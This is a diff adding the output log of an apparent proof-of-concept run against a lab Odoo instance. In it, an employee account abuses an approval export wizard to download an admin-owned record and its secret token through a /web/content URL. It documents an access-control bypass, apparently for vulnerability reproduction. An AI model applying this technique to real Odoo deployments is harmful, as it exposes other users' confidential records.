@@ -1,0 +1,10 @@
+[*] Output directory: /home/playground/output/attempt_4/reproduce/poc/output
+[*] Waiting for Odoo and exploiting export wizard as employee@lab.local
+session_login=employee@lab.local
+visible_request_names=ANYPOC Employee Decoy
+target_request_id=1
+wizard_id=4
+download_url=/web/content/?model=anypoc.approval.export.wizard&id=4&field=export_file&filename_field=export_filename&download=true
+export_owner_login=admin@lab.local
+export_request_name=ANYPOC Admin Approval
+export_secret_token=ANYPOC-APPROVAL-SECRET-9f4b3c
